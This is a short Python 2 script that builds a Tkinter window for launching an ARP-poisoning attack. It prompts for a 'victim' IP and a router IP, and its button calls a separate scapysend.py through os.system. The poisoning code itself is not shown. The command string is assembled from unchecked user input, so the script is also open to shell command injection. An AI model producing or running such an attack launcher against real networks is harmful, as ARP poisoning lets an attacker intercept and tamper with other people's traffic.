#!/usr/bin/python
from Tkinter import *
#import scapysend
import os

v = raw_input("Enter victim's IP address::")
r = raw_input("Enter the router's IP address::")
#scapysend.parse_args(v,r)

root = Tk()
#logo = PhotoImage(file="images/b.gif")
root.title("Run Scapysend")
root.geometry("600x400")
#root.configure(background='black')
root.configure(background='white')
explanation = """If you click the button below, you will launch the scapysend
script which will cause ARP poisoning to occur. For this to happen you must
enter the victim IP and the router IP. -v will be the victim's IP and -r will
be the router's IP. To launch the script you must use the command:
python scapysend.py -v(ip address) -r(ip address) """
#w = Label(root, compound = CENTER, text=explanation, image=logo).pack(side="right")
w = Label(root, compound = CENTER, text=explanation).pack(side="right")
app = Frame(root)
app.pack(side=BOTTOM)
def callback():
#	execfile("scapysend.py")
        os.system("python scapysend.py -v" + v + " -r" + r)
	print("Clicked. Starting...")
bttn1 = Button(app,text = "Run Script",command=callback, fg="yellow", bg= "black")
bttn1.pack(fill=X)
root.mainloop()




